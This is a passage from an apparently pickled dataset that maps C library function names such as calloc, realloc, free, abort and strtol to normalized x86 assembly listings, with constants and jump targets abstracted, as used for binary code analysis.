ESP+0]\nMOV~[EDX+0],ECX\nMOV~[ECX+0],EDX\nCMP~ESI,0\nLEA~ECX,[EAX+0]\nJBE~FOO\nMOV~EBX,[ESP+0]\nLEA~EDX,[EAX+EBX]\nOR~EBX,0\nMOV~[EAX+0],EBX\nMOV~EAX,ESI\nOR~EAX,0\nMOV~[EBP+0],EDX\nMOV~[EBP+0],EDX\nMOV~[EDX+0],0\nMOV~[EDX+0],0\nMOV~[EDX+0],EAX\nMOV~[EDX+ESI],ESI\nJMP~FOO\nMOV~EAX,ECX\nCMP~EAX,EDX\nJNZ~FOO\nMOV~ECX,[ESP+0]\nMOV~ESI,0\nINC~ECX\nMOV~EDI,ECX\nSHR~EDI,0\nLEA~EBX,<STR>\nAND~ECX,0\nMOV~EDX,<STR>\nSHL~ESI,CL\nCMP~ESI,EDX\nJA~FOO\nTEST~ESI,ESI\nJNZ~FOO\nINC~EDI\nCMP~EDI,0\nJA~FOO\nMOV~EDX,<STR>\nTEST~EDX,EDX\nJZ~FOO\nMOV~EAX,EDI\nMOV~ESI,0\nSHL~EAX,0\nLEA~EBX,[EAX+0]\nJMP~FOO\nADD~EBX,0\nADD~ESI,ESI\nTEST~EDX,ESI\nJZ~FOO\nMOV~ECX,[EBX+0]\nCMP~ECX,EBX\nJNZ~FOO\nMOV~EAX,ESI\nLEA~EBX,[ECX+0]\nNOT~EAX\nAND~EDX,EAX\nADD~ESI,ESI\nMOV~<STR>,EDX\nJMP~FOO\nMOV~EDX,[ECX+0]\nMOV~EAX,[ECX+0]\nAND~EDX,0\nMOV~ESI,EDX\nSUB~ESI,[ESP+0]\nMOV~[EBX+0],EAX\nMOV~[EAX+0],EBX\nCMP~ESI,0\nJA~FOO\nOR~[ECX+EDX+0],0\nJMP~FOO\nMOV~EAX,[ESP+0]\nCMP~EAX,0\nLEA~EDX,[ECX+EAX]\nMOV~[EBP+0],EDX\nMOV~[EBP+0],EDX\nMOV~[EDX+0],0\nMOV~[EDX+0],0\nJA~FOO\nMOV~<STR>,EDX\nOR~[ESP+0],0\nMOV~EAX,ESI\nMOV~EBX,[ESP+0]\nOR~EAX,0\nMOV~[ECX+0],EBX\nMOV~[EDX+ESI],ESI\nMOV~[EDX+0],EAX\nLEA~EBX,[ECX+0]\nJMP~FOO\nMOV~EBX,<STR>\nMOV~ESI,[ESP+0]\nADD~ESI,0\nMOV~ECX,[EBX+0]\nMOV~[ESP+0],ESI\nAND~ECX,0\nCMP~ECX,ESI\nJB~FOO\nMOV~EAX,[ESP+0]\nLEA~EDX,[EBX+EAX]\nOR~EAX,0\nMOV~<STR>,EDX\nMOV~[EBX+0],EAX\nSUB~ECX,[ESP+0]\nJMP~FOO\nMOV~EDX,<STR>\nTEST~<STR>,0\nJZ~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nPOP~EBX\nMOV~EAX,[ESP+0]\nSUB~EAX,0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nJMP~FOO\nLEA~ECX,[EDX-0]\nMOV~EBX,[ESP+0]\nMOV~[ESP+0],ECX\nCMP~EBX,<STR>\nJB~FOO\nMOV~EAX,<STR>\nCMP~EAX,<STR>\nJGE~FOO\nMOV~EAX,ECX\nLEA~EBX,[EDX+EBX+0]\nNOT~EAX\nAND~EBX,EAX\nCMP~EBX,[ESP+0]\nJBE~FOO\nPUSH~ECX\nPUSH~ECX\nPUSH~0\nPUSH~0\nPUSH~0\nPUSH~0\nPUSH~EBX\nPUSH~0\nCALL~FOO\nADD~ESP,0\nMOV~EDX,EAX\nCMP~EAX,0\nJZ~FOO\nMOV~ECX,EAX\nAND~ECX,0\nJZ~FOO\nMOV~EAX,0\nMOV~ESI,EBX\nSUB~EAX,ECX\nADD~EDX,EAX\nSUB~ESI,EAX\nMOV~[EDX],EAX\nMOV~EAX,ESI\nJMP~FOO\nMOV~DWORDPTR[EAX],0\nMOV~EAX,EBX\nOR~EAX,0\nMOV~[EDX+0],EAX\nMOV~EAX,<STR>\nINC~EAX\nMOV~<STR>,EAX\nCMP~EAX,<STR>\nJLE~FOO\nMOV~<STR>,EAX\nMOV~EAX,<STR>\nADD~EAX,EBX\nMOV~<STR>,EAX\nCMP~EAX,<STR>\nJBE~FOO\nMOV~<STR>,EAX\nADD~EAX,<STR>\nCMP~EAX,<STR>\nJBE~FOO\nMOV~<STR>,EAX\nJMP~FOO\nMOV~EAX,<STR>\nMOV~[ESP+0],EAX\nMOV~EBP,[EAX+0]\nMOV~EAX,[ESP+0]\nADD~EAX,0\nAND~EBP,0\nADD~EAX,<STR>\nTEST~<STR>,0\nJZ~FOO\nSUB~EAX,EBP\nMOV~EDX,[ESP+0]\nADD~EAX,[ESP+0]\nNOT~EDX\nMOV~ESI,EDX\nMOV~[ESP+0],EDX\nAND~ESI,EAX\nJLE~FOO\nSUB~ESP,0\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nOR~EDX,0\nMOV~EBX,EAX\nCMP~EAX,0\nJNZ~FOO\nTEST~<STR>,0\nJZ~FOO\nMOV~EAX,[ESP+0]\nADD~EAX,EBP\nADD~ESI,EAX\nAND~ESI,[ESP+0]\nCMP~ESI,0\nJA~FOO\nMOV~ESI,0\nCMP~ESI,[ESP+0]\nJBE~FOO\nPUSH~EDX\nPUSH~EDX\nPUSH~0\nPUSH~0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~0\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nCMP~EAX,0\nJZ~FOO\nAND~<STR>,0\nLEA~EDX,[EAX+ESI]\nCMP~EBX,0\nJZ~FOO\nMOV~ECX,[ESP+0]\nADD~<STR>,ESI\nADD~ECX,EBP\nCMP~EBX,ECX\nJNZ~FOO\nCMP~EDX,0\nJNZ~FOO\nLEA~EAX,[ESI+EBP]\nMOV~ECX,[ESP+0]\nOR~EAX,0\nMOV~[ECX+0],EAX\nJMP~FOO\nMOV~EAX,<STR>\nTEST~AL,0\nJZ~FOO\nTEST~EBP,EBP\nJZ~FOO\nCMP~EBX,ECX\nJNB~FOO\nAND~EAX,0\nMOV~<STR>,EAX\nTEST~<STR>,0\nJZ~FOO\nTEST~EBP,EBP\nJZ~FOO\nMOV~EAX,EBX\nSUB~EAX,ECX\nADD~<STR>,EAX\nMOV~EDX,EBX\nAND~EDX,0\nJNZ~FOO\nMOV~EDI,EBX\nXOR~EAX,EAX\nJMP~FOO\nMOV~EAX,0\nSUB~EAX,EDX\nLEA~EDI,[EBX+EAX]\nLEA~ESI,[EBX+ESI]\nLEA~ECX,[EAX+EBP]\nMOV~EDX,ESI\nMOV~[ESP+0],ESI\nADD~EDX,ECX\nMOV~ESI,[ESP+0]\nLEA~EAX,[EDX+ESI]\nAND~EAX,[ESP+0]\nSUB~ESP,0\nSUB~EAX,EDX\nLEA~ESI,[ECX+EAX]\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nMOV~EDX,EAX\nCMP~EAX,0\nJNZ~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nMOV~EDX,EAX\nJMP~FOO\nCMP~EAX,EBX\nJNB~FOO\nAND~<STR>,0\nMOV~EDX,[ESP+0]\nJMP~FOO\nCMP~EDX,0\nJZ~FOO\nMOV~EDI,EBX\nXOR~ESI,ESI\nJMP~FOO\nSUB~ESP,0\nMOV~EDI,EBX\nPUSH~0\nCALL~FOO\nMOV~EDX,EAX\nSUB~EAX,EBX\nSUB~EAX,ESI\nADD~<STR>,EAX\nXOR~ESI,ESI\nADD~ESP,0\nCMP~EDX,0\nJZ~FOO\nSUB~EDX,EDI\nMOV~<STR>,EDI\nLEA~EAX,[EDX+ESI]\nOR~EAX,0\nMOV~[EDI+0],EAX\nADD~<STR>,ESI\nTEST~EBP,EBP\nJZ~FOO\nLEA~EAX,[EBP-0]\nMOV~ECX,[ESP+0]\nAND~EAX,0\nMOV~EDX,EAX\nOR~EDX,0\nCMP~EAX,0\nMOV~[ECX+0],EDX\nMOV~[ECX+EAX+0],0\nMOV~[ECX+EAX+0],0\nJBE~FOO\nSUB~ESP,0\nMOV~EAX,ECX\nADD~EAX,0\nMOV~EBX,<STR>\nPUSH~EAX\nMOV~<STR>,0\nCALL~FOO\nMOV~<STR>,EBX\nADD~ESP,0\nMOV~EAX,<STR>\nCMP~EAX,<STR>\nJBE~FOO\nMOV~<STR>,EAX\nADD~EAX,<STR>\nCMP~EAX,<STR>\nJBE~FOO\nMOV~<STR>,EAX\nMOV~EBX,<STR>\nMOV~ECX,[EBX+0]\nAND~ECX,0\nCMP~ECX,[ESP+0]\nJB~FOO\nMOV~ESI,[ESP+0]\nMOV~EAX,ESI\nSUB~ECX,ESI\nLEA~EDX,[EBX+ESI]\nOR~EAX,0\nMOV~<STR>,EDX\nMOV~[EBX+0],EAX\nOR~ECX,0\nADD~EBX,0\nMOV~[EDX+0],ECX\nJMP~FOO\nMOV~ECX,[ESP+0]\nMOV~EAX,EDI\nSUB~EAX,[ESP+0]\nLEA~EDX,[EBP+ECX+0]\nOR~ECX,0\nMOV~<STR>,EDX\nMOV~[EBP+0],ECX\nMOV~ECX,EAX\nMOV~<STR>,EDX\nOR~ECX,0\nMOV~<STR>,EDX\nMOV~[EDX+0],0\nMOV~[EDX+0],0\nMOV~[EDX+0],ECX\nMOV~[EDX+EAX],EAX\nJMP~FOO\nMOV~EBX,[ESP+0]\nOR~[EBP+EBX+0],0\nLEA~EBX,[EBP+0]\nJMP~FOO\nOR~[EAX+EBX+0],0\nMOV~EBX,ECX\nJMP~FOO\nCALL~FOO\nXOR~EBX,EBX\nMOV~DWORDPTR[EAX],0\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nADD~ESP,0\nMOV~EAX,EBX\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p338
L1908L
tp339
a(S'calloc'
p340
S'"PUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~EDX,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~EBX,EDX\nIMUL~EBX,ECX\nTEST~EDX,EDX\nJZ~FOO\nMOV~EDI,EDX\nMOV~EAX,EBX\nXOR~EDX,EDX\nDIV~,EDI\nCMP~ECX,EAX\nJZ~FOO\nCALL~FOO\nXOR~EBX,EBX\nMOV~DWORDPTR[EAX],0\nJMP~FOO\nPUSH~ESI\nPUSH~0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~[ESP],EBX\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nTEST~EAX,EAX\nJZ~FOO\nMOV~EAX,[EAX-0]\nTEST~AL,0\nJNZ~FOO\nAND~EAX,0\nLEA~EDX,[EAX-0]\nMOV~EAX,EDX\nSHR~EAX,0\nCMP~EAX,0\nJBE~FOO\nPUSH~ECX\nPUSH~EDX\nPUSH~0\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nMOV~DWORDPTR[EBX],0\nMOV~[EBX+0],0\nMOV~[EBX+0],0\nCMP~EAX,0\nJBE~FOO\nMOV~[EBX+0],0\nMOV~[EBX+0],0\nCMP~EAX,0\nJBE~FOO\nMOV~[EBX+0],0\nMOV~[EBX+0],0\nCMP~EAX,0\nJBE~FOO\nMOV~[EBX+0],0\nMOV~[EBX+0],0\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nADD~ESP,0\nMOV~EAX,EBX\nPOP~EBX\nPOP~ESI\nPOP~EDI\nRETN"'
p341
L244L
tp342
a(S'realloc'
p343
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~EBX,[ESP+0]\nCMP~[ESP+0],0\nJNZ~FOO\nSUB~ESP,0\nPUSH~EBX\nCALL~FOO\nMOV~EBX,EAX\nJMP~FOO\nTEST~EBX,EBX\nJNZ~FOO\nSUB~ESP,0\nPUSH~[ESP+0]\nCALL~FOO\nJMP~FOO\nPUSH~EDI\nPUSH~0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nADD~ESP,0\nCMP~EBX,0\nJBE~FOO\nCALL~FOO\nXOR~EBX,EBX\nMOV~DWORDPTR[EAX],0\nJMP~FOO\nLEA~EAX,[EBX+0]\nMOV~[ESP+0],0\nCMP~EAX,0\nJBE~FOO\nAND~EAX,0\nMOV~[ESP+0],EAX\nMOV~EDI,[ESP+0]\nSUB~EDI,0\nMOV~EDX,[EDI+0]\nMOV~EAX,EDX\nAND~EAX,0\nMOV~[ESP+0],EAX\nTEST~DL,0\nJNZ~FOO\nMOV~ECX,[ESP+0]\nMOV~EBX,EAX\nCMP~EAX,ECX\nJNB~FOO\nLEA~ESI,[EDI+EAX]\nCMP~ESI,<STR>\nJNZ~FOO\nMOV~EAX,[ESI+0]\nMOV~ECX,EBX\nAND~EAX,0\nADD~ECX,EAX\nMOV~EAX,[ESP+0]\nADD~EAX,0\nCMP~ECX,EAX\nJB~FOO\nAND~EDX,0\nOR~EDX,[ESP+0]\nMOV~[EDI+0],EDX\nMOV~ESI,[ESP+0]\nSUB~ECX,ESI\nLEA~EAX,[EDI+ESI]\nOR~ECX,0\nMOV~<STR>,EAX\nMOV~[EAX+0],ECX\nJMP~FOO\nMOV~EDX,[ESI+0]\nMOV~EAX,EDX\nAND~EAX,0\nTEST~[ESI+EAX+0],0\nJNZ~FOO\nAND~EDX,0\nMOV~EBX,[ESP+0]\nADD~EBX,EDX\nCMP~EBX,[ESP+0]\nJB~FOO\nMOV~EDX,[ESI+0]\nMOV~EAX,[ESI+0]\nCMP~[EDX+0],ESI\nJNZ~FOO\nCMP~[EAX+0],ESI\nJZ~FOO\nCALL~FOO\nMOV~[EDX+0],EAX\nMOV~[EAX+0],EDX\nJMP~FOO\nSUB~ESP,0\nMOV~EAX,[ESP+0]\nSUB~EAX,0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nMOV~EDX,EAX\nTEST~EAX,EAX\nJZ~FOO\nLEA~EBX,[EAX-0]\nCMP~EBX,ESI\nMOV~EAX,[EBX+0]\nJNZ~FOO\nAND~EAX,0\nMOV~EDX,[ESP+0]\nLEA~EBX,[EAX+EDX]\nJMP~FOO\nMOV~EAX,[ESP+0]\nSUB~EAX,0\nMOV~ECX,EAX\nSHR~ECX,0\nCMP~ECX,0\nJBE~FOO\nPUSH~ESI\nPUSH~EAX\nPUSH~[ESP+0]\nPUSH~EDX\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nMOV~ESI,[ESP+0]\nCMP~ECX,0\nMOV~EAX,[ESI]\nMOV~[EDX],EAX\nMOV~EAX,[ESI+0]\nMOV~[EDX+0],EAX\nMOV~EAX,[ESI+0]\nMOV~[EDX+0],EAX\nJBE~FOO\nMOV~EAX,[ESI+0]\nCMP~ECX,0\nMOV~[EDX+0],EAX\nMOV~EAX,[ESI+0]\nMOV~[EDX+0],EAX\nJBE~FOO\nMOV~EAX,[ESI+0]\nCMP~ECX,0\nMOV~[EDX+0],EAX\nMOV~EAX,[ESI+0]\nMOV~[EDX+0],EAX\nJBE~FOO\nMOV~EAX,[ESI+0]\nMOV~[EDX+0],EAX\nMOV~EAX,[ESI+0]\nMOV~[EDX+0],EAX\nSUB~ESP,0\nADD~EBX,0\nPUSH~[ESP+0]\nCALL~FOO\nJMP~FOO\nMOV~ECX,EBX\nSUB~ECX,[ESP+0]\nCMP~ECX,0\nJA~FOO\nMOV~EAX,[EDI+0]\nAND~EAX,0\nOR~EAX,EBX\nMOV~[EDI+0],EAX\nOR~[EDI+EBX+0],0\nJMP~FOO\nMOV~EDX,[ESP+0]\nLEA~EAX,[EDI+EDX]\nMOV~EDX,[EDI+0]\nAND~EDX,0\nOR~EDX,[ESP+0]\nSUB~ESP,0\nMOV~[EDI+0],EDX\nMOV~EDX,ECX\nOR~EDX,0\nMOV~[EAX+0],EDX\nOR~[EAX+ECX+0],0\nADD~EAX,0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nLEA~EBX,[EDI+0]\nJMP~FOO\nMOV~ECX,[ESP+0]\nMOV~EAX,<STR>\nDEC~EAX\nMOV~ESI,[ESP+0]\nMOV~EBP,[ECX-0]\nADD~ESI,0\nMOV~[ESP],ESI\nLEA~EDX,[EAX+EBP]\nNOT~EAX\nLEA~ESI,[EDX+ESI]\nAND~ESI,EAX\nMOV~EBX,ESI\nSUB~EBX,EBP\nCMP~[ESP+0],EBX\nJZ~FOO\nPUSH~0\nPUSH~ESI\nMOV~EAX,[ESP+0]\nSUB~EDI,EBP\nADD~EAX,EBP\nPUSH~EAX\nPUSH~EDI\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJZ~FOO\nLEA~EDX,[EAX+EBP]\nOR~EBX,0\nMOV~EAX,ESI\nMOV~[EDX+0],EBX\nSUB~EAX,[ESP+0]\nADD~EAX,<STR>\nMOV~<STR>,EAX\nCMP~EAX,<STR>\nJBE~FOO\nMOV~<STR>,EAX\nADD~EAX,<STR>\nCMP~EAX,<STR>\nJBE~FOO\nMOV~<STR>,EAX\nLEA~EBX,[EDX+0]\nJMP~FOO\nMOV~EAX,[ESP]\nCMP~[ESP+0],EAX\nJNB~FOO\nSUB~ESP,0\nMOV~EAX,[ESP+0]\nSUB~EAX,0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nTEST~EAX,EAX\nJZ~FOO\nPUSH~ECX\nMOV~EAX,[ESP+0]\nSUB~EAX,0\nPUSH~EAX\nPUSH~[ESP+0]\nPUSH~EBX\nCALL~FOO\nPOP~EDX\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nXOR~EBX,EBX\nJMP~FOO\nMOV~EBX,[ESP+0]\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nADD~ESP,0\nMOV~EAX,EBX\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p344
L808L
tp345
a(S'__malloc_trim'
p346
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~EBP,EDX\nMOV~ECX,[EDX+0]\nMOV~EDX,[EDX+0]\nMOV~ESI,[EDX+0]\nAND~ESI,0\nMOV~EDX,ESI\nSUB~EDX,EAX\nLEA~EAX,[EDX+ECX-0]\nXOR~EDX,EDX\nDIV~,ECX\nLEA~EBX,[EAX-0]\nIMUL~EBX,ECX\nTEST~EBX,EBX\nJLE~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nMOV~EDI,EAX\nMOV~EAX,ESI\nADD~EAX,[EBP+0]\nADD~ESP,0\nCMP~EDI,EAX\nJNZ~FOO\nSUB~ESP,0\nNEG~EBX\nPUSH~EBX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJZ~FOO\nMOV~ECX,EDI\nSUB~ECX,EAX\nJZ~FOO\nMOV~EAX,[EBP+0]\nSUB~[EBP+0],ECX\nSUB~ESI,ECX\nOR~ESI,0\nMOV~[EAX+0],ESI\nMOV~EAX,0\nJMP~FOO\nXOR~EAX,EAX\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p347
L141L
tp348
a(S'__malloc_consolidate'
p349
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~EDX,[ESP+0]\nMOV~EAX,[EDX]\nMOV~EDX,0\nTEST~EAX,EAX\nJZ~FOO\nMOV~ECX,[ESP+0]\nAND~EAX,0\nMOV~[ECX],EAX\nADD~ECX,0\nMOV~EAX,[ESP+0]\nMOV~EDX,[ESP+0]\nADD~EAX,0\nMOV~[ESP+0],ECX\nMOV~[ESP+0],EAX\nMOV~EAX,[EDX]\nMOV~ECX,[ESP+0]\nSHR~EAX,0\nLEA~EAX,[ECX+EAX*4-0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~ECX,[EAX]\nTEST~ECX,ECX\nJZ~FOO\nMOV~DWORDPTR[EAX],0\nMOV~EDX,[ECX+0]\nMOV~[ESP+0],EDX\nMOV~EAX,[ECX+0]\nMOV~EDI,EAX\nAND~EDI,0\nTEST~AL,0\nLEA~EBX,[ECX+EDI]\nMOV~EDX,[EBX+0]\nMOV~[ESP+0],EDX\nJNZ~FOO\nMOV~EBP,[ECX]\nMOV~EAX,ECX\nSUB~EAX,EBP\nMOV~ESI,[EAX+0]\nMOV~EDX,[EAX+0]\nMOV~ECX,[ESI+0]\nCMP~ECX,EAX\nJNZ~FOO\nCMP~[EDX+0],ECX\nJNZ~FOO\nADD~EDI,EBP\nMOV~[ESI+0],EDX\nMOV~[EDX+0],ESI\nMOV~EAX,[ESP+0]\nMOV~EBP,[ESP+0]\nAND~EBP,0\nCMP~EBX,[EAX+0]\nJZ~FOO\nMOV~EAX,[EBX+EBP+0]\nMOV~[EBX+0],EBP\nAND~EAX,0\nTEST~EAX,EAX\nJNZ~FOO\nMOV~EDX,[EBX+0]\nMOV~EAX,[EBX+0]\nMOV~ESI,[EDX+0]\nCMP~ESI,EBX\nJNZ~FOO\nCMP~[EAX+0],ESI\nJZ~FOO\nCALL~FOO\nADD~EDI,EBP\nMOV~[EDX+0],EAX\nMOV~[EAX+0],EDX\nMOV~EAX,[ESP+0]\nMOV~EDX,[EAX+0]\nMOV~[EAX+0],ECX\nMOV~EAX,EDI\nOR~EAX,0\nMOV~[EDX+0],ECX\nMOV~[ECX+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ECX+0],EDX\nMOV~[ECX+0],EAX\nMOV~[ECX+EDI],EDI\nJMP~FOO\nLEA~EAX,[EDI+EBP]\nOR~EAX,0\nMOV~[ECX+0],EAX\nMOV~EDX,[ESP+0]\nMOV~[EDX+0],ECX\nMOV~ECX,[ESP+0]\nTEST~ECX,ECX\nJNZ~FOO\nMOV~ECX,[ESP+0]\nCMP~[ESP+0],ECX\nJZ~FOO\nADD~[ESP+0],0\nJMP~FOO\nMOV~ECX,[ESP+0]\nLEA~EAX,[ECX+EDX*8+0]\nINC~EDX\nMOV~[EAX+0],EAX\nMOV~[EAX+0],EAX\nCMP~EDX,0\nJLE~FOO\nMOV~EAX,[ESP+0]\nOR~[EAX+0],0\nMOV~[EAX+0],0\nMOV~[EAX+0],0\nMOV~[EAX+0],0\nMOV~[EAX+0],0\nMOV~EDX,[ESP+0]\nSUB~ESP,0\nMOV~EAX,[EDX]\nAND~EAX,0\nOR~EAX,0\nMOV~[EDX],EAX\nMOV~EAX,EDX\nADD~EAX,0\nMOV~[EDX+0],EAX\nPUSH~0\nCALL~FOO\nMOV~ECX,[ESP+0]\nADD~ESP,0\nMOV~[ECX+0],EAX\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p350
L424L
tp351
a(S'free'
p352
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~EDI,[ESP+0]\nTEST~EDI,EDI\nJZ~FOO\nPUSH~ESI\nPUSH~0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nLEA~ECX,[EDI-0]\nMOV~EAX,<STR>\nADD~ESP,0\nMOV~EDX,[ECX+0]\nMOV~EBX,EDX\nAND~EBX,0\nCMP~EBX,EAX\nJA~FOO\nSHR~EBX,0\nOR~EAX,0\nMOV~<STR>,EAX\nLEA~EDX,<STR>\nMOV~EAX,[EDX-0]\nMOV~[ECX+0],EAX\nMOV~[EDX-0],ECX\nJMP~FOO\nAND~DL,0\nJNZ~FOO\nOR~EAX,0\nLEA~ESI,[ECX+EBX]\nMOV~<STR>,EAX\nMOV~EAX,[ESI+0]\nMOV~[ESP+0],EAX\nTEST~[ECX+0],0\nJNZ~FOO\nMOV~EBP,[EDI-0]\nMOV~EAX,ECX\nSUB~EAX,EBP\nMOV~EDI,[EAX+0]\nMOV~EDX,[EAX+0]\nMOV~ECX,[EDI+0]\nCMP~ECX,EAX\nJNZ~FOO\nCMP~[EDX+0],ECX\nJNZ~FOO\nADD~EBX,EBP\nMOV~[EDI+0],EDX\nMOV~[EDX+0],EDI\nMOV~EBP,[ESP+0]\nAND~EBP,0\nCMP~ESI,<STR>\nJZ~FOO\nMOV~EAX,[ESI+EBP+0]\nMOV~[ESI+0],EBP\nAND~EAX,0\nTEST~EAX,EAX\nJNZ~FOO\nMOV~EDX,[ESI+0]\nMOV~EAX,[ESI+0]\nMOV~EDI,[EDX+0]\nCMP~EDI,ESI\nJNZ~FOO\nCMP~[EAX+0],EDI\nJZ~FOO\nCALL~FOO\nMOV~[EDX+0],EAX\nMOV~[EAX+0],EDX\nADD~EBX,EBP\nMOV~EAX,<STR>\nMOV~[ECX+0],0\nMOV~[ECX+0],EAX\nMOV~[ECX+EBX],EBX\nMOV~[EAX+0],ECX\nMOV~EAX,EBX\nOR~EAX,0\nMOV~<STR>,ECX\nMOV~[ECX+0],EAX\nJMP~FOO\nADD~EBX,EBP\nMOV~EAX,EBX\nOR~EAX,0\nMOV~[ECX+0],EAX\nMOV~<STR>,ECX\nCMP~EBX,0\nJBE~FOO\nTEST~<STR>,0\nJZ~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nMOV~EAX,<STR>\nMOV~EAX,[EAX+0]\nAND~EAX,0\nCMP~EAX,<STR>\nJB~FOO\nMOV~EDX,0\nMOV~EAX,<STR>\nCALL~FOO\nJMP~FOO\nMOV~EDX,[EDI-0]\nDEC~<STR>\nLEA~EAX,[EBX+EDX]\nSUB~ECX,EDX\nPUSH~EBX\nPUSH~EBX\nPUSH~EAX\nPUSH~ECX\nSUB~<STR>,EAX\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p353
L412L
tp354
a(S'abort'
p355
S'"PUSH~EBX\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nMOV~EAX,0\nADD~ESP,0\nJMP~FOO\nMOV~[ESP+EAX*4+0],0\nDEC~EAX\nJNS~FOO\nPUSH~EBX\nPUSH~EBX\nPUSH~0\nLEA~EBX,[ESP+0]\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJNZ~FOO\nPUSH~ECX\nPUSH~0\nPUSH~EBX\nPUSH~0\nCALL~FOO\nADD~ESP,0\nCMP~<STR>,0\nJNZ~FOO\nMOV~<STR>,0\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nADD~ESP,0\nMOV~AL,<STR>\nCMP~AL,0\nJNZ~FOO\nPUSH~EDX\nPUSH~0\nPUSH~0\nMOV~<STR>,0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nMOV~[ESP+0],0\nMOV~EAX,0\nADD~ESP,0\nJMP~FOO\nMOV~[ESP+EAX*4+0],0\nDEC~EAX\nJNS~FOO\nMOV~[ESP+0],0\nPUSH~EAX\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nCMP~AL,0\nJNZ~FOO\nMOV~<STR>,0\nHLT\nCMP~<STR>,0\nJNZ~FOO\nSUB~ESP,0\nMOV~<STR>,0\nPUSH~0\nCALL~FOO\nHLT"'
p356
L271L
tp357
a(S'atol'
p358
S'"SUB~ESP,0\nPUSH~0\nPUSH~0\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nRETN"'
p359
L20L
tp360
a(S'strtol'
p361
S'"SUB~ESP,0\nPUSH~0\nPUSH~[ESP+0]\nPUSH~[ESP+0]\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nRETN"'
p362
L26L
tp363
a(S'_stdlib_strto_l'
p364
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~EDX,<STR>\nMOV~ECX,[ESP+0]\nMOV~ESI,[ESP+0]\nMOV~EBX,ECX\nJMP~FOO\nINC~EBX\nMOVSX~EAX,BYTEPTR[EBX]\nTEST~BYTEPTR[EDX+EAX*2],0\nJNZ~FOO\nCMP~EAX,0\nJZ~FOO\nXOR~EBP,EBP\nCMP~EAX,0\nJNZ~FOO\nMOV~EBP,0\nJMP~FOO\nXOR~EBP,EBP\nINC~EBX\nMOV~EDI,ECX\nTEST~ESI,0\nJNZ~FOO\nADD~ESI,0\nCMP~BYTEPTR[EBX],0\nJNZ~FOO\nINC~EBX\nSUB~ESI,0\nMOV~EDI,EBX\nMOV~AL,[EBX]\nOR~EAX,0\nCMP~AL,0\nJNZ~FOO\nADD~ESI,ESI\nINC~EBX\nCMP~ESI,0\nJLE~FOO\nMOV~ESI,0\nLEA~EAX,[ESI-0]\nXOR~EDX,EDX\nCMP~EAX,0\nJA~FOO\nOR~EAX,0\nXOR~EDX,EDX\nDIV~,ESI\nMOV~[ESP+0],DL\n